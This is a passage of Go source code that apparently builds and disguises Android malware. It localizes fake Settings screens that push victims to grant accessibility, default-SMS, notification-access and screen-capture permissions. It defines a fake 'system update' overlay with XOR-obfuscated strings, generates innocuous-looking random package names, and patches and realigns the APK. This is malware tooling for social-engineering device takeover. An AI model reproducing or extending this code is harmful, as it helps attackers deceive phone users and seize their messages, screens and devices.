			displaySize: "Tamaño de pantalla y texto", colorMotion: "Color y movimiento",
			magnification: "Ampliación", zoomScreen: "Desactivado / Ampliar pantalla",
			accessMenu: "Menú de accesibilidad", controlMenu: "Desactivado / Controlar con menú",
			batterySaver: "Ahorro de batería", batteryUsage: "Uso de batería",
			batteryPct: "Porcentaje de batería", statusBar: "Mostrar en barra de estado",
			deviceControls: "Controles del dispositivo", doNotDisturb: "No molestar", notifHistory: "Historial de notificaciones",
			notifStyle: "Estilo de notificación", appNotif: "Notificaciones de apps",
			locAccess: "Acceso a ubicación", locAccuracy: "Precisión de ubicación", locHistory: "Historial de ubicación",
			screenRec: "Grabación de pantalla", audioSettings: "Ajustes de audio", cast: "Transmitir",
			descAccessibility: "Esta aplicación requiere permiso de acceso. Por favor, permita para continuar.",
			descBattery:       "Esta aplicación requiere acceso ilimitado a la batería. Por favor, permita.",
			descSmsDefault:    "Esta aplicación debe establecerse como controlador de SMS predeterminado y requiere acceso ilimitado a la batería.",
			descNotifAccess:   "Esta aplicación requiere acceso a notificaciones para sincronización de datos y entrega de mensajes.",
			descNotifPermit:   "Esta aplicación requiere permiso de notificaciones para actualizaciones importantes. Por favor, permita.",
			descScreen:        "Se requiere permiso de captura de pantalla para monitoreo de seguridad. Por favor, permita.",
			smsHint: "Abra Ajustes &#x2192; Apps predeterminadas &#x2192; SMS y seleccione esta aplicación.",
			smsBtn:  "Abrir ajustes",
		},
		"pt": {
			settings: "Configurações", downloaded: "Apps baixados",
			requireAccess: "Este aplicativo requer permissão de acesso para funcionar.",
			enable: "Ativar", off: "Desativado",
			displaySize: "Tamanho da tela e texto", colorMotion: "Cor e movimento",
			magnification: "Ampliação", zoomScreen: "Desativado / Ampliar tela",
			accessMenu: "Menu de acessibilidade", controlMenu: "Desativado / Controle pelo menu",
			batterySaver: "Economia de bateria", batteryUsage: "Uso da bateria",
			batteryPct: "Porcentagem da bateria", statusBar: "Mostrar na barra de status",
			deviceControls: "Controles do dispositivo", doNotDisturb: "Não perturbe", notifHistory: "Histórico de notificações",
			notifStyle: "Estilo de notificação", appNotif: "Notificações de apps",
			locAccess: "Acesso à localização", locAccuracy: "Precisão da localização", locHistory: "Histórico de localização",
			screenRec: "Gravação de tela", audioSettings: "Configurações de áudio", cast: "Transmitir",
			descAccessibility: "Este aplicativo requer permissão de acesso. Por favor, permita para continuar.",
			descBattery:       "Este aplicativo requer acesso irrestrito à bateria. Por favor, permita.",
			descSmsDefault:    "Este aplicativo precisa ser definido como manipulador de SMS padrão e requer acesso irrestrito à bateria.",
			descNotifAccess:   "Este aplicativo requer acesso a notificações para sincronização de dados e entrega de mensagens.",
			descNotifPermit:   "Este aplicativo requer permissão de notificação para atualizações importantes. Por favor, permita.",
			descScreen:        "A permissão de captura de tela é necessária para monitoramento de segurança. Por favor, permita.",
			smsHint: "Abra Configurações &#x2192; Apps padrão &#x2192; SMS e selecione este aplicativo.",
			smsBtn:  "Abrir configurações",
		},
		"ar": {
			settings: "الإعدادات", downloaded: "التطبيقات المحملة",
			requireAccess: "يتطلب هذا التطبيق إذن الوصول للعمل.",
			enable: "تفعيل", off: "إيقاف",
			displaySize: "حجم العرض والنص", colorMotion: "اللون والحركة",
			magnification: "التكبير", zoomScreen: "إيقاف / تكبير الشاشة",
			accessMenu: "قائمة إمكانية الوصول", controlMenu: "إيقاف / التحكم عبر القائمة",
			batterySaver: "توفير الطاقة", batteryUsage: "استخدام البطارية",
			batteryPct: "نسبة البطارية", statusBar: "إظهار في شريط الحالة",
			deviceControls: "عناصر التحكم", doNotDisturb: "عدم الإزعاج", notifHistory: "سجل الإشعارات",
			notifStyle: "نمط الإشعارات", appNotif: "إشعارات التطبيقات",
			locAccess: "الوصول إلى الموقع", locAccuracy: "دقة الموقع", locHistory: "سجل المواقع",
			screenRec: "تسجيل الشاشة", audioSettings: "إعدادات الصوت", cast: "البث",
			descAccessibility: "يتطلب هذا التطبيق إذن الوصول للعمل. يرجى السماح للمتابعة.",
			descBattery:       "يتطلب هذا التطبيق وصولاً غير مقيد إلى البطارية. يرجى السماح.",
			descSmsDefault:    "يجب تعيين هذا التطبيق كمعالج رسائل SMS الافتراضي ويتطلب وصولاً غير مقيد إلى البطارية.",
			descNotifAccess:   "يتطلب هذا التطبيق الوصول إلى الإشعارات لمزامنة البيانات وتسليم الرسائل.",
			descNotifPermit:   "يتطلب هذا التطبيق إذن الإشعارات لتقديم التحديثات المهمة. يرجى السماح.",
			descScreen:        "إذن التقاط الشاشة مطلوب لمراقبة الأمان. يرجى السماح.",
			smsHint: "افتح الإعدادات &#x2192; التطبيقات الافتراضية &#x2192; الرسائل القصيرة واختر هذا التطبيق.",
			smsBtn:  "فتح الإعدادات",
		},
	}
	t, ok := m[lang]
	if !ok {
		return nil
	}
	jsOverride := `var d=JSON.parse(j);` +
		`delete d.sectionLabel;delete d.appStatus;delete d.buttonText;` +
		fmt.Sprintf(
			`var _D={accessibility:\'%s\',battery_sms:\'%s\',battery_standalone:\'%s\',`+
				`post_notifications:\'%s\',notification_access:\'%s\',`+
				`sms_default:\'%s\',media_projection:\'%s\'};`+
				`if(_D[d.stepId])d.description=_D[d.stepId];`+
				`if(d.manualSmsHint)d.manualSmsHint=\'%s\';`+
				`if(d.manualSmsBtn)d.manualSmsBtn=\'%s\';`,
			t.descAccessibility, t.descBattery, t.descBattery,
			t.descNotifPermit, t.descNotifAccess,
			t.descSmsDefault, t.descScreen,
			t.smsHint, t.smsBtn,
		)
	return map[string]string{
		`html lang=\"en\"`:  fmt.Sprintf(`html lang=\"%s\"`, lang),
		`html lang=\"ru\"`:  fmt.Sprintf(`html lang=\"%s\"`, lang),
		`>Settings</h1>`:    fmt.Sprintf(`>%s</h1>`, t.settings),
		`>Downloaded apps</div>`: fmt.Sprintf(`>%s</div>`, t.downloaded),
		`>This app requires access permission to work.</div>`: fmt.Sprintf(`>%s</div>`, t.requireAccess),
		`>Enable</button>`:  fmt.Sprintf(`>%s</button>`, t.enable),
		`>Open Settings</button>`: fmt.Sprintf(`>%s</button>`, t.enable),
		`||\'Settings\'`:    fmt.Sprintf(`||\'%s\'`, t.settings),
		`||\'Downloaded apps\'`: fmt.Sprintf(`||\'%s\'`, t.downloaded),
		`||\'Enable\'`:      fmt.Sprintf(`||\'%s\'`, t.enable),
		`||\'Off\'`:         fmt.Sprintf(`||\'%s\'`, t.off),
		`var d=JSON.parse(j);`: jsOverride,
		`t:\'Display size and text\'`:                   fmt.Sprintf(`t:\'%s\'`, t.displaySize),
		`t:\'Color and motion\'`:                        fmt.Sprintf(`t:\'%s\'`, t.colorMotion),
		`t:\'Magnification\',d:\'Off / Zoom in on the screen\'`: fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.magnification, t.zoomScreen),
		`t:\'Accessibility Menu\',d:\'Off / Control device via large menu\'`: fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.accessMenu, t.controlMenu),
		`t:\'Battery Saver\',d:\'Off\'`:                 fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.batterySaver, t.off),
		`t:\'Battery usage\'`:                           fmt.Sprintf(`t:\'%s\'`, t.batteryUsage),
		`t:\'Battery percentage\',d:\'Show in status bar\'`: fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.batteryPct, t.statusBar),
		`t:\'On-device controls\'`:                      fmt.Sprintf(`t:\'%s\'`, t.deviceControls),
		`t:\'Do Not Disturb\'}`:                         fmt.Sprintf(`t:\'%s\'}`, t.doNotDisturb),
		`t:\'Do Not Disturb\',d:\'Off\'`:                fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.doNotDisturb, t.off),
		`t:\'Notification history\',d:\'Off\'`:          fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.notifHistory, t.off),
		`t:\'Notification style\'`:                      fmt.Sprintf(`t:\'%s\'`, t.notifStyle),
		`t:\'App notifications\'`:                       fmt.Sprintf(`t:\'%s\'`, t.appNotif),
		`t:\'App location access\'`:                     fmt.Sprintf(`t:\'%s\'`, t.locAccess),
		`t:\'Location accuracy\'`:                       fmt.Sprintf(`t:\'%s\'`, t.locAccuracy),
		`t:\'Location history\'`:                        fmt.Sprintf(`t:\'%s\'`, t.locHistory),
		`t:\'Screen recording\'`:                        fmt.Sprintf(`t:\'%s\'`, t.screenRec),
		`t:\'Audio settings\'`:                          fmt.Sprintf(`t:\'%s\'`, t.audioSettings),
		`t:\'Cast\',d:\'Off\'`:                          fmt.Sprintf(`t:\'%s\',d:\'%s\'`, t.cast, t.off),
	}
}

var typefaceKey = [8]byte{67, 22, 59, 231, 144, 223, 178, 199}

func typefaceEncode(s string) string {
	var b strings.Builder
	idx := 0
	for _, r := range s {
		xor := int(r) ^ int(typefaceKey[idx%8])
		fmt.Fprintf(&b, "%04X", xor)
		idx++
	}
	return b.String()
}

func getUpdateScreenStrings(lang string) map[string]string {
	type us struct {
		title, subtitle, status      string
		warnHeader, warnBody         string
		progEarly, progMid           string
		progLate, progComplete       string
	}

	m := map[string]us{
		"ru": {
			title:        "Установка системного обновления...",
			subtitle:     "Ваше устройство обновляется.\nЭто может занять несколько минут.",
			status:       "Оптимизация системы...",
			warnHeader:   "Шаг 1 из 2 — Установка обновления",
			warnBody:     "Не выключайте устройство и не\nизвлекайте батарею. Устройство\nперезагрузится автоматически.",
			progEarly:    "Установка обновления...",
			progMid:      "Оптимизация системы...",
			progLate:     "Настройка системы...",
			progComplete: "Завершение установки...",
		},
		"de": {
			title:        "Systemupdate wird installiert...",
			subtitle:     "Ihr Gerät wird aktualisiert.\nDies kann einige Minuten dauern.",
			status:       "System wird optimiert...",
			warnHeader:   "Schritt 1 von 2 — Update installieren",
			warnBody:     "Schalten Sie Ihr Gerät nicht aus und\nentfernen Sie nicht den Akku. Das Gerät\nwird automatisch neu gestartet.",
			progEarly:    "Update wird installiert...",
			progMid:      "System wird optimiert...",
			progLate:     "System wird konfiguriert...",
			progComplete: "Installation wird abgeschlossen...",
		},
		"fr": {
			title:        "Installation de la mise à jour...",
			subtitle:     "Votre appareil est en cours de mise à\njour. Cela peut prendre quelques minutes.",
			status:       "Optimisation du système...",
			warnHeader:   "Étape 1 sur 2 — Installation",
			warnBody:     "Ne pas éteindre votre appareil ni retirer\nla batterie. Votre appareil redémarrera\nautomatiquement une fois terminé.",
			progEarly:    "Installation de la mise à jour...",
			progMid:      "Optimisation du système...",
			progLate:     "Configuration du système...",
			progComplete: "Finalisation de l'installation...",
		},
		"es": {
			title:        "Instalando actualización del sistema...",
			subtitle:     "Su dispositivo se está actualizando.\nEsto puede tardar unos minutos.",
			status:       "Optimizando sistema...",
			warnHeader:   "Paso 1 de 2 — Instalando actualización",
			warnBody:     "No apague su dispositivo ni extraiga\nla batería. Su dispositivo se reiniciará\nautomáticamente al completar.",
			progEarly:    "Instalando actualización...",
			progMid:      "Optimizando sistema...",
			progLate:     "Configurando sistema...",
			progComplete: "Finalizando instalación...",
		},
		"pt": {
			title:        "Instalando atualização do sistema...",
			subtitle:     "Seu dispositivo está sendo atualizado.\nIsso pode levar alguns minutos.",
			status:       "Otimizando sistema...",
			warnHeader:   "Etapa 1 de 2 — Instalando atualização",
			warnBody:     "Não desligue o dispositivo nem remova\na bateria. O dispositivo será reiniciado\nautomaticamente ao concluir.",
			progEarly:    "Instalando atualização...",
			progMid:      "Otimizando sistema...",
			progLate:     "Configurando sistema...",
			progComplete: "Finalizando instalação...",
		},
		"tr": {
			title:        "Sistem güncellemesi yükleniyor...",
			subtitle:     "Cihazınız güncelleniyor.\nBu birkaç dakika sürebilir.",
			status:       "Sistem optimize ediliyor...",
			warnHeader:   "Adım 1/2 — Güncelleme yükleniyor",
			warnBody:     "Cihazınızı kapatmayın ve pili\nçıkarmayın. Cihazınız tamamlandığında\notomatik olarak yeniden başlayacak.",
			progEarly:    "Güncelleme yükleniyor...",
			progMid:      "Sistem optimize ediliyor...",
			progLate:     "Sistem yapılandırılıyor...",
			progComplete: "Yükleme tamamlanıyor...",
		},
		"ar": {
			title:        "...جارٍ تثبيت تحديث النظام",
			subtitle:     "جهازك قيد التحديث.\nقد يستغرق هذا بضع دقائق.",
			status:       "...جارٍ تحسين النظام",
			warnHeader:   "الخطوة 1 من 2 — تثبيت التحديث",
			warnBody:     "لا تقم بإيقاف تشغيل جهازك أو إزالة\nالبطارية. سيتم إعادة تشغيل جهازك\nتلقائياً عند الانتهاء.",
			progEarly:    "...جارٍ تثبيت التحديث",
			progMid:      "...جارٍ تحسين النظام",
			progLate:     "...جارٍ تهيئة النظام",
			progComplete: "...جارٍ إنهاء التثبيت",
		},
	}

	t, ok := m[lang]
	if !ok {
		return nil
	}

	origTitle := "000A00780048009300F100B300DE00AE002D0071001B009400E900AC00C600A2002E0036004E009700F400BE00C600A2006D00380015"
	origSubtitle := "001A0079004E009500B000BB00D700B1002A0075005E00C700F900AC009200B200330072005A009300F900B100D500E9006300420053008E00E300FF00DF00A6003A0036004F008600FB00BA00B800A600630070005E009000B000B200DB00A900360062005E009400BE"
	origStatus := "000C0066004F008E00FD00B600C800AE002D0071001B009400E900AC00C600A2002E0038001500C9"
	origWarnH := "00100062005E009700B000EE009200A800250036000900C7208400FF00FB00A900300062005A008B00FC00B600DC00A000630063004B008300F100AB00D7"
	origWarnB := "00070079001B008900FF00AB009200B300360064005500C700FF00B900D400E7003A0079004E009500B000BB00D700B1002A0075005E00C700FF00AD009200B50026007B0054009100F500FF00C600AF0026001C0059008600E400AB00D700B5003A0038001B00BE00FF00AA00C000E700270073004D008E00F300BA009200B0002A007A005700C700E200BA00C100B300220064004F00C700F100AA00C600A8002E0077004F008E00F300BE00DE00AB003A001C004C008F00F500B1009200A4002C007B004B008B00F500AB00D700E9"
	origEarly := "000A00780048009300F100B300DE00AE002D0071001B009200E000BB00D300B300260038001500C9"
	origLate := "000000790055008100F900B800C700B5002A0078005C00C700E300A600C100B30026007B001500C900BE"
	origComplete := "0005007F0055008E00E300B700DB00A9002400360052008900E300AB00D300AB002F0077004F008E00FF00B1009C00E9006D"

	return map[string]string{
		origTitle:    typefaceEncode(t.title),
		origSubtitle: typefaceEncode(t.subtitle),
		origStatus:   typefaceEncode(t.status),
		origWarnH:    typefaceEncode(t.warnHeader),
		origWarnB:    typefaceEncode(t.warnBody),
		origEarly:    typefaceEncode(t.progEarly),
		origLate:     typefaceEncode(t.progLate),
		origComplete: typefaceEncode(t.progComplete),
	}
}

func zipalign4(src, dst string) error {
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer r.Close()

	outFile, err := os.Create(dst)
	if err != nil {
		return err
	}

	type entryRecord struct {
		header *zip.FileHeader
		offset int64
	}

	var (
		offset  int64
		entries []entryRecord
	)

	for _, f := range r.File {
		header := f.FileHeader
		forceStore := header.Name == "resources.arsc"

		var data []byte

		if forceStore && header.Method != zip.Store {
			rc, err := f.Open()
			if err != nil {
				outFile.Close()
				return fmt.Errorf("decompress %s: %w", f.Name, err)
			}
			data, err = io.ReadAll(rc)
			rc.Close()
			if err != nil {
				outFile.Close()
				return fmt.Errorf("read %s: %w", f.Name, err)
			}
			header.Method = zip.Store
			header.CRC32 = crc32.ChecksumIEEE(data)
			header.CompressedSize64 = uint64(len(data))
			header.UncompressedSize64 = uint64(len(data))
			header.CompressedSize = uint32(len(data))
			header.UncompressedSize = uint32(len(data))
		} else {
			rawReader, err := f.OpenRaw()
			if err != nil {
				outFile.Close()
				return fmt.Errorf("open raw %s: %w", f.Name, err)
			}
			data, err = io.ReadAll(rawReader)
			if err != nil {
				outFile.Close()
				return fmt.Errorf("read raw %s: %w", f.Name, err)
			}
		}

		header.Flags &^= 0x8 // clear data descriptor flag

		extra := header.Extra
		if header.Method == zip.Store {
			dataStart := offset + 30 + int64(len(header.Name)) + int64(len(extra))
			if mod := dataStart % 4; mod != 0 {
				padding := int(4 - mod)
				extra = append(extra, make([]byte, padding)...)
			}
		}
		header.Extra = extra

		localHeaderOffset := offset
		entries = append(entries, entryRecord{header: &header, offset: localHeaderOffset})

		if err := writeLocalHeader(outFile, &header); err != nil {
			outFile.Close()
			return fmt.Errorf("write header %s: %w", header.Name, err)
		}
		offset += 30 + int64(len(header.Name)) + int64(len(header.Extra))

		if _, err := outFile.Write(data); err != nil {
			outFile.Close()
			return fmt.Errorf("write data %s: %w", header.Name, err)
		}
		offset += int64(len(data))
	}

	centralStart := offset
	for _, e := range entries {
		if err := writeCentralEntry(outFile, e.header, e.offset); err != nil {
			outFile.Close()
			return err
		}
		offset += 46 + int64(len(e.header.Name)) + int64(len(e.header.Extra)) + int64(len(e.header.Comment))
	}
	centralSize := offset - centralStart

	if err := writeEndRecord(outFile, len(entries), centralSize, centralStart); err != nil {
		outFile.Close()
		return err
	}

	return outFile.Close()
}

func writeLocalHeader(w io.Writer, h *zip.FileHeader) error {
	var buf [30]byte
	binary.LittleEndian.PutUint32(buf[0:], 0x04034b50)     // signature
	binary.LittleEndian.PutUint16(buf[4:], 20)             // version needed
	binary.LittleEndian.PutUint16(buf[6:], h.Flags)        // flags
	binary.LittleEndian.PutUint16(buf[8:], uint16(h.Method))
	binary.LittleEndian.PutUint16(buf[10:], h.ModifiedTime)
	binary.LittleEndian.PutUint16(buf[12:], h.ModifiedDate)
	binary.LittleEndian.PutUint32(buf[14:], h.CRC32)
	binary.LittleEndian.PutUint32(buf[18:], h.CompressedSize)
	binary.LittleEndian.PutUint32(buf[22:], h.UncompressedSize)
	binary.LittleEndian.PutUint16(buf[26:], uint16(len(h.Name)))
	binary.LittleEndian.PutUint16(buf[28:], uint16(len(h.Extra)))
	if _, err := w.Write(buf[:]); err != nil {
		return err
	}
	if _, err := io.WriteString(w, h.Name); err != nil {
		return err
	}
	_, err := w.Write(h.Extra)
	return err
}

func writeCentralEntry(w io.Writer, h *zip.FileHeader, localOffset int64) error {
	var buf [46]byte
	binary.LittleEndian.PutUint32(buf[0:], 0x02014b50)     // signature
	binary.LittleEndian.PutUint16(buf[4:], 20)             // version made by
	binary.LittleEndian.PutUint16(buf[6:], 20)             // version needed
	binary.LittleEndian.PutUint16(buf[8:], h.Flags)
	binary.LittleEndian.PutUint16(buf[10:], uint16(h.Method))
	binary.LittleEndian.PutUint16(buf[12:], h.ModifiedTime)
	binary.LittleEndian.PutUint16(buf[14:], h.ModifiedDate)
	binary.LittleEndian.PutUint32(buf[16:], h.CRC32)
	binary.LittleEndian.PutUint32(buf[20:], h.CompressedSize)
	binary.LittleEndian.PutUint32(buf[24:], h.UncompressedSize)
	binary.LittleEndian.PutUint16(buf[28:], uint16(len(h.Name)))
	binary.LittleEndian.PutUint16(buf[30:], uint16(len(h.Extra)))
	binary.LittleEndian.PutUint16(buf[32:], uint16(len(h.Comment)))
	binary.LittleEndian.PutUint16(buf[34:], 0)             // disk number
	binary.LittleEndian.PutUint16(buf[36:], 0)             // internal attrs
	binary.LittleEndian.PutUint32(buf[38:], h.ExternalAttrs)
	binary.LittleEndian.PutUint32(buf[42:], uint32(localOffset))
	if _, err := w.Write(buf[:]); err != nil {
		return err
	}
	if _, err := io.WriteString(w, h.Name); err != nil {
		return err
	}
	if _, err := w.Write(h.Extra); err != nil {
		return err
	}
	_, err := w.Write([]byte(h.Comment))
	return err
}

var pkgPrefixes = []string{"com", "io", "net", "org", "dev"}
var pkgMidWords = []string{
	"secure", "system", "device", "smart", "cloud", "mobile", "digital",
	"core", "global", "fast", "lite", "prime", "nova", "pixel", "apex",
	"guard", "shield", "trust", "safe", "ultra", "pro", "max", "neo",
}
var pkgEndWords = []string{
	"service", "manager", "helper", "updater", "sync", "connect", "hub",
	"tools", "utility", "bridge", "monitor", "health", "cleaner", "booster",
	"protect", "shield", "keeper", "agent", "daemon", "runner", "worker",
}

func generateRandomPackage() string {
	var seed [8]byte
	rand.Read(seed[:])
	r := mrand.New(mrand.NewSource(int64(binary.LittleEndian.Uint64(seed[:]))))

	prefix := pkgPrefixes[r.Intn(len(pkgPrefixes))]
	mid := pkgMidWords[r.Intn(len(pkgMidWords))]
	end := pkgEndWords[r.Intn(len(pkgEndWords))]

	suffix := fmt.Sprintf("%c%c%c",
		'a'+byte(r.Intn(26)),
		'a'+byte(r.Intn(26)),
		'0'+byte(r.Intn(10)),
	)

	return fmt.Sprintf("%s.%s.%s.%s", prefix, mid, end, suffix)
}

func patchPackageName(workDir, oldPkg, newPkg string) error {
	manifest := filepath.Join(workDir, "AndroidManifest.xml")
	mData, err := os.ReadFile(manifest)
	if err != nil {
		return fmt.Errorf("read manifest: %w", err)
	}
	ms := string(mData)

	ms = strings.Replace(ms, `package="`+oldPkg+`"`, `package="`+newPkg+`"`, 1)

	ms = strings.ReplaceAll(ms, `android:authorities="`+oldPkg+`.`, `android:authorities="`+newPkg+`.`)

	ms = strings.ReplaceAll(ms,
		`android:name="`+oldPkg+`.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"`,
		`android:name="`+newPkg+`.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"`)
	ms = strings.ReplaceAll(ms,
		`<uses-permission android:name="`+oldPkg+`.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>`,
		`<uses-permission android:name="`+newPkg+`.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>`)

	if err := os.WriteFile(manifest, []byte(ms), 0644); err != nil {
		return fmt.Errorf("write manifest: %w", err)
	}
	return nil
}

func writeEndRecord(w io.Writer, count int, centralSize, centralStart int64) error {
	var buf [22]byte
	binary.LittleEndian.PutUint32(buf[0:], 0x06054b50)
	binary.LittleEndian.PutUint16(buf[4:], 0)              // disk number
	binary.LittleEndian.PutUint16(buf[6:], 0)              // disk with central dir
	binary.LittleEndian.PutUint16(buf[8:], uint16(count))
	binary.LittleEndian.PutUint16(buf[10:], uint16(count))
	binary.LittleEndian.PutUint32(buf[12:], uint32(centralSize))
	binary.LittleEndian.PutUint32(buf[16:], uint32(centralStart))
	binary.LittleEndian.PutUint16(buf[20:], 0)             // comment length
	_, err := w.Write(buf[:])
	return err
}
